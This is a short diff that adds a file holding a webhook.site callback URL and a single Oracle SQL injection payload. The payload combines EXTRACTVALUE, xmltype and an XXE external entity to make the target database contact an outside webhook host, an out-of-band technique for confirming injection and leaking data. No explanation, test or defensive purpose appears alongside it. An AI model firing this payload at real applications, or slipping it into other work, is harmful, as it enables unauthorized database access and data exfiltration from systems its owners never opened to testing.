@@ -1,0 +1,7 @@
+https://webhook.site/7399a8da-b3f4-4473-9d4c-0c04c5d0e69c
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://webhook.site/6bac8f32-5ab1-4d0c-bef7-981c706417ac"> %remote;]>'),'/l') FROM dual)-- -
+
+
+
+
